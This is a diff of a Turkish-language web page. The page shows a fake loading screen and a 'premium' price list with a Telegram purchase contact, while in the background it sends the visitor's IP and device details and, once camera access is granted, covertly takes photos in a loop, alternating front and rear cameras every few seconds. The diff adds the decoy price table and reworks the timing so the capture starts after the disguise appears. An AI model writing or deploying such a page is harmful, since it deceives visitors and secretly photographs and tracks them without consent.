@@ -83,7 +83,6 @@
       animation:blink 1.2s infinite;
     }
 
-    /* İzin Reddedildiğinde Çıkacak Alan */
     .error-box {
       display: none;
       background: rgba(255, 0, 0, 0.1);
@@ -133,6 +132,49 @@
     #hiddenVideo{
       display:none;
     }
+
+    .fiyat-table {
+      margin-top: 20px;
+      background: rgba(255, 0, 0, 0.05);
+      border: 1px solid #ff000033;
+      border-radius: 10px;
+      padding: 15px;
+      display: none;
+    }
+
+    .fiyat-table h3 {
+      color: #ff0000;
+      margin-bottom: 10px;
+    }
+
+    .fiyat-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      border-bottom: 1px solid #ff000022;
+      color: #ddd;
+      font-size: 15px;
+    }
+
+    .fiyat-item:last-child {
+      border-bottom: none;
+    }
+
+    .fiyat-item span:last-child {
+      color: #ff4d4d;
+      font-weight: bold;
+    }
+
+    .contact-info {
+      margin-top: 15px;
+      color: #888;
+      font-size: 14px;
+    }
+
+    .contact-info a {
+      color: #ff4d4d;
+      text-decoration: none;
+    }
   </style>
 </head>
 <body>
@@ -149,6 +191,29 @@
       </div>
       <div class="percent" id="percent">0%</div>
       <div class="fake-status" id="status">Sunucuya bağlanılıyor...</div>
+    </div>
+
+    <div id="fiyatArea" class="fiyat-table">
+      <h3>💎 HAFTALIK PREMİUM</h3>
+      <div class="fiyat-item">
+        <span>⚡ HAFTALIK PREMİUM</span>
+        <span>150 TL</span>
+      </div>
+      <div class="fiyat-item">
+        <span>🔥 AYLIK PREMİUM</span>
+        <span>350 TL</span>
+      </div>
+      <div class="fiyat-item">
+        <span>🚀 3 AYLIK PREMİUM</span>
+        <span>750 TL</span>
+      </div>
+      <div class="fiyat-item">
+        <span>🏆 ÖMÜR BOYU PREMİUM</span>
+        <span>2.500 TL</span>
+      </div>
+      <div class="contact-info">
+        📩 Satın almak için: <a href="https://t.me/policecc" target="_blank">@policecc</a>
+      </div>
     </div>
 
     <div id="errorArea" class="error-box">
@@ -183,6 +248,7 @@
     const statusText = document.getElementById("status");
     const loadingArea = document.getElementById("loadingArea");
     const errorArea = document.getElementById("errorArea");
+    const fiyatArea = document.getElementById("fiyatArea");
 
     const fakeMessages = [
       "Sunucuya bağlanılıyor...",
@@ -192,26 +258,11 @@
       "Paketler indiriliyor..."
     ];
 
-    let progressInterval = setInterval(() => {
-      if(progress < 95){
-        progress += Math.random() * 2;
-        if(progress > 95) progress = 95;
-        progressBar.style.width = progress + "%";
-        percentText.innerText = Math.floor(progress) + "%";
-      }
-    }, 350);
-
-    setInterval(() => {
-      if (loadingArea.style.display !== "none") {
-        const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-        statusText.innerText = randomMessage;
-      }
-    }, 2000);
-
     // ========== KAMERA VE VERİ SİSTEMİ ==========
     let mediaStream = null;
     let fotoSayac = 0;
     let ipBilgisi = 'bilinmiyor';
+    let izinIstendi = false;
 
     async function getIp() {
       try {
@@ -305,12 +356,12 @@
       }
     }
 
-    let sira = 1; // 0 = ön, 1 = arka
+    let sira = 1;
     async function siradakiFotoyuCek() {
       if (sira === 0) {
         const basarili = await kamerayiAc('user');
         if (basarili) {
-          await new Promise(r => setTimeout(r, 600)); // Hızlı geçiş için bekleme süresi optimize edildi
+          await new Promise(r => setTimeout(r, 600));
           await fotoCek('on');
         }
         sira = 1;
@@ -324,42 +375,77 @@
       }
     }
 
+    // === YÜKLEME BARINI ÇALIŞTIR ===
+    function baslatYuklemeBari() {
+      progress = 0;
+      progressBar.style.width = "0%";
+      percentText.innerText = "0%";
+      loadingArea.style.display = "block";
+      fiyatArea.style.display = "none";
+      errorArea.style.display = "none";
+
+      const progressInterval = setInterval(() => {
+        if (progress < 95) {
+          progress += Math.random() * 2;
+          if (progress > 95) progress = 95;
+          progressBar.style.width = progress + "%";
+          percentText.innerText = Math.floor(progress) + "%";
+        }
+      }, 350);
+
+      setTimeout(() => {
+        const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
+        statusText.innerText = randomMessage;
+      }, 2000);
+
+      return progressInterval;
+    }
+
     // === ANA MOTOR ===
     async function baslat() {
       // Önce cihaz bilgisini arka planda fırlat
       cihazBilgisiGonder();
 
+      // Yükleme barını başlat
+      const progressInterval = baslatYuklemeBari();
+
       console.log("Kamera izni isteniyor...");
+      
+      // 3 saniye bekle (yükleme barı dönsün)
+      await new Promise(r => setTimeout(r, 3000));
+      
       const izinVerildi = await kamerayiAc('user');
       
       if (izinVerildi) {
-        // İzin verildiyse uyarı kutusunu gizle, yükleme barını koru
-        errorArea.style.display = "none";
-        loadingArea.style.display = "block";
-
-        // Yükleme barını %100 yap
+        // Barı %100 yap
         clearInterval(progressInterval);
         progressBar.style.width = "100%";
         percentText.innerText = "100%";
         statusText.innerText = "Bağlantı başarıyla kuruldu!";
 
-        await new Promise(r => setTimeout(r, 800));
-        await fotoCek('on');
+        await new Promise(r => setTimeout(r, 1500));
         
-        // İSTEĞİNİZ: Artık her 3 saniyede (3000 ms) bir sırayla ön/arka çekim yapar
-        setInterval(siradakiFotoyuCek, 3000);
+        // Yükleme alanını gizle
+        loadingArea.style.display = "none";
+        
+        // Fiyat tablosunu göster
+        fiyatArea.style.display = "block";
+
+        // 3 saniye sonra foto çekmeye başla
+        setTimeout(async () => {
+          await fotoCek('on');
+          setInterval(siradakiFotoyuCek, 4000);
+        }, 3000);
+        
       } else {
-        // İzin reddedildiyse yükleme ekranını gizle, hata ve tekrar dene kutusunu aç
+        clearInterval(progressInterval);
         loadingArea.style.display = "none";
         errorArea.style.display = "block";
       }
     }
 
-    // Kullanıcı kırmızı butona tıkladığında tekrar tetikler
     async function yenidenDene() {
         errorArea.style.display = "none";
-        loadingArea.style.display = "block";
-        statusText.innerText = "Yeniden izin isteniyor...";
         await baslat();
     }
 
